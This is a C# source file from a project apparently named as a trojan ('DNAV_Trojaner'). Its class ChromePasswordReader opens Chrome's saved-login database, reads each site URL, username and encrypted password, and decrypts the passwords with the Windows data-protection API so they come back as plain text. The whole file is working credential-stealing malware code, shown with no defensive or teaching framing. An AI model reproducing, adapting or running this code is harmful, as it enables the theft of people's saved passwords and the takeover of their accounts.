using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;

namespace DNAV_Trojaner
{
    public class ChromePasswordReader : IPasswordReader
    {
        public string BrowserName { get { return "Chrome"; } }
        private const string _dataPath = "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";

        public IEnumerable<Credential> GetPasswords()
        {
            string folder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string file = Path.GetFullPath(folder + _dataPath);
            List<Credential> credentials = new List<Credential>();

            if(File.Exists(file))
            {
                SQLiteConnection connection = new SQLiteConnection($"Data Source={file};");
                connection.Open();
                SQLiteCommand command = connection.CreateCommand();
                command.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                SQLiteDataReader reader = command.ExecuteReader();
                if (reader.HasRows)
                {
                    while (reader.Read())
                    {
                        string password = Encoding.UTF8.GetString(ProtectedData.Unprotect(GetBytes(reader, 2), null, DataProtectionScope.CurrentUser));

                        Credential temp = new Credential(reader.GetString(0), reader.GetString(1), password);

                        credentials.Add(temp);
                    }
                }
                connection.Close();
            }
            return credentials;
        }

        private byte[] GetBytes(SQLiteDataReader reader, int index)
        {
            const int CHUNK = 1024 * 2;
            byte[] buffer = new byte[CHUNK];
            long bytes;
            long offset = 0;
            MemoryStream stream = new MemoryStream();
            while((bytes = reader.GetBytes(index, offset, buffer, 0, buffer.Length)) > 0)
            {
                stream.Write(buffer, 0, (int)bytes);
                offset += bytes;
            }
            return stream.ToArray();
        }
    }
}
